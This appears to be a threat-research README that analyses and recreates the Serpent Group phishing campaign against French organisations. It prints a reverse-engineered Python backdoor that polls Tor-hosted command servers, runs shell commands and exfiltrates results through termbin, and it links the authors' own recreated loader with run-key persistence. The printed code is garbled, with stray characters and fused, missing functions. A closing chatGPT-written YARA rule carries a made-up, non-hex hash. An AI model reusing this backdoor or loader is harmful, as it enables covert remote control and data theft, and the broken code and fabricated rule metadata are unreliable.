# Serpent Group üêç

![](img/serpent.jpg)

A brief and technical study about a malicious campaign targeting french entities in the construction, real estate and government industries.

---

## Intro

In march 2022, **Proofpoint** identified a new email campaign aimed at french entities, one month before the presidential elections.

The security firm attributed this campaign to a likely advanced threat actor, named **Serpent Group**, based on the TTPs observed especially leveraging the python language as a vector. The ultimate objective still remains unknown. 

This study focuses on detailing and reproducing the initial access techniques and procedures used during this campaign.

## Initial Access

Attackers used spear-phishing with attachment (MITRE T1566.001) and a resume-themed subject line.

</p>


The attached Microsoft Word document, masquerading as an information related to GPDR, contained a malicious VBA macro which downloads an image (```https://www.fhccu[.]com/images/ship3[.]jpg```)  that contains a powershell script embedded and executes it.

The use of this steganography technique is well documented ([**MITRE T1027.003**](hhttps://attack.mitre.org/software/S0231/)). Groups like **Sandworm Team** have already exploited it during their campaigns, particularly with the [**Invoke-PSImage**](https://github.com/peewpw/Invoke-PSImage) tool.

We developed our own version of the malicious VBA Macro which decrypts and executes a powershell command under the Outlook process to download an retrieve the malicious image.

<p align=center>
    <img src="img/macro.png" width="80%">
</p>

The powershell script, embedded in the image, downloads and installs **Chocolatey**, a package manager for Windows, similar to apt-get or yum on Linux systems.

    <img src="img/chocolatey.png" width="40%">
</p>

Then, the powershell script used **Chocolatey** to install **Python** and **pip** to install various dependencies including **PySocks**, on the Windows target machine. Keep in mind that this action requires administrative privileges.

Next, the powershell script downloaded another image (```https://www.fhccu[.]com/images/7[.]jpg```) containing a python script also hidden using steganography and saved the python script as **MicrosoftSecurityUpdate.py**. Finally, it created and executed a .bat script that in turn executed the malicious MicrosoftSecurityUpdate.py a.k.a [**Serpent Backdoor**](tools/MicrosoftSecurityUpdate.py).

During this study, we came up with a similar powershell script, named [**chocoloader.ps1**](tools/chocoloader.ps1), that installs [**Anaconda**](https://community.chocolatey.org/packages/anaconda3) instead which doesn't require elevated privileges. We also implemented a registry run key persistence which will run python and the Serpent backdoor.

## Custom C2

The reverse engineering of the Serpent backdoor revealed the following custom Python C2 agent :

```python
#!/usr/bin/python3  
  
from subprocess import Popen, PIPE, STDOUT  
import requests  
import re  
import socket  
import time  
  
cmd\_url\_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd[.]onion.pet/index.html'  
cmd\_url\_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid[.]onion.pet/index.html'  
hostname = socket.gethostname()  
hostname_pattern = 'host:%s-00' % hostname  
headers = {}  
referer = {'Referer': hostname_pattern}  
cache_control = {'Cache-Control': 'no-cache'}  
headers.update(referer)  
headers.update(cache_control)  
check\_cmd\_1 = ''  
  
def recvall(sock, n):  
¬† data = b''  
¬† while len(data) < n:  
¬†¬†¬† packet = sock.recv(n - len(data))  
¬†¬†¬† if not packet:  
¬†¬†¬†¬†¬† return None  
¬†¬†¬† data += packet  
¬† return data  
  
  
def get_cmd():  
¬†¬†¬† req = requests.get(cmd\_url\_order, headers=headers).content.decode().strip()  
¬†¬†¬† if req == '':  
¬†¬†¬†¬†¬†¬†¬† pass  
¬†¬†¬† else:  
¬†¬†¬†¬†¬†¬†¬† return req

¬†¬†¬† cmd_split = cmd.split('--')  
¬†¬†¬† if cmd_split\[1\] == hostname:  
¬†¬†¬†¬†¬†¬†¬† cmd = cmd_split\[2\]  
¬†¬†¬†¬†¬†¬†¬† print(cmd)  
¬†¬†¬†¬†¬†¬†¬† run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()  
¬†¬†¬†¬†¬†¬†¬† out = run.stdout.read()  
¬†¬†¬†¬†¬†¬†¬† if not out:  
¬†¬†¬†¬†¬†¬† ¬†¬†¬†¬†¬†out = b'ok'  
¬†¬†¬†¬†¬†¬†¬† termbin_cnx = socks.socksocket()  
¬†¬†¬†¬†¬†¬†¬† termbin\_cnx = socket.socket(socket.AF\_INET, socket.SOCK_STREAM)

¬†¬†¬†¬†¬†¬†¬† termbin_cnx.connect(('termbin[.]com', 9999))  
¬†¬†¬†¬†¬†¬†¬† termbin_cnx.send(out)  
¬†¬†¬†¬†¬†¬†¬† recv = termbin_cnx.recv(100000)  
¬†¬†¬†¬†¬†¬†¬† termbin\_url\_created = recv.decode().rstrip('\\x00').strip()  
¬†¬†¬†¬†¬†¬†¬† print(termbin\_url\_created)  
¬†¬†¬†¬†¬†¬†¬† termbin\_header = {'Referer': hostname\_pattern+" -- "+termbin\_url\_created}  
¬†¬†¬†¬†¬†¬†¬† headers.update(termbin_header)  
¬†¬†¬†¬†¬†¬†¬† try:  
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† push = requests.get(cmd\_url\_answer, headers=headers)  
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† print('executed')  
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† headers.update(referer)  
¬†¬†¬†¬†¬†¬†¬† except Exception as e:  
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† print(e)  
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† pass  
¬†¬†¬† else:  
¬†¬†¬†¬†¬†¬†¬† print('not for me')  
¬†¬†¬†¬†¬†¬†¬†  
while True:  
¬†¬†¬† time.sleep(10)  
¬†¬†¬† try:  
¬†¬†¬†¬†¬†¬†¬† check\_cmd = get\_cmd()  
¬†¬†¬†¬†¬†¬†¬† if check\_cmd != check\_cmd_1:  
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† time.sleep(20)  
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† print(check_cmd)  
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† run\_cmd(check\_cmd)  
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† check\_cmd\_1 = check_cmd  
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† pass  
¬†¬†¬† except Exception as e:  
¬†¬†¬†¬†¬†¬†¬† print(e)  
¬†¬†¬†¬†¬†¬†¬† pass

```
Here is a quick analyze :
1. Every 10 seconds, Client fetches "orders" or "commands" server with his hostname as unique identifier in the "Referer" HTTP header
2. If response is not empty, Client waits 20 seconds, and then run the given command
3. Result of the command will be sent to Termbin, a pastebin-like website : give it content and receive a link to access your content posted
4. It sets up a SOCKS proxy through Tor
5. Client makes a request to Termbin, and get a link
6. The link is then sent to the "anwser" C2 server with the HTTP header "Referer" being used to store the hostname and the Termbin link to access to the results of the executed command

This is what the client does.

From the Serpent client, we mapped the workflow of the Command & Control cycle, and the data exfiltration process :

## YARA Rules

Here is an example of a yara rule to detect a powershell or python script embedded in an image. This rule has been generated using chatGPT.

<pre>
<code>
rule Image_Containing_Scripting_Language
{
    meta:
        author = "chatGPT"
        description = "Rule to detect image containing PowerShell or Python script"
        reference = "https://proofpoint.com/us/threat-insight/post/serpent-group-targets-french-entities-via-malicious-image-attachments"
        date = "2022-03-01"
        hash = "1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p"
    strings:
        $powershell = "powershell" ascii nocase
        $python = "python" ascii nocase
        $powershell_encoded = {40 70 6F 77 65 72 73 68 65 6C 6C}
        $python_encoded = {40 70 79 74 68 6F 6E}
        $script = {63 72 65 61 74 65 20 53 63 72 69 70 74}
        $obfuscated_1 = "eval("
        $obfuscated_2 = "str_rot13("
        $obfuscated_3 = "base64_decode("

    condition:
        any of ($powershell, $python, $powershell_encoded, $python_encoded) and $script and (any of ($obfuscated_1, $obfuscated_2, $obfuscated_3))
}
</code>
</pre>

This rule looks for the strings "powershell", "python" in the file being scanned, the encoded version of the these string, the string "create script" which is a common string found in scripts, and also look for common obfuscation techniques such as eval(), str_rot13(), base64_decode().

It's also possible to add more obfuscation techniques, but keep in mind that the rule may become too specific and may not match other variations of the same script. It's always a balance between specificity and coverage.
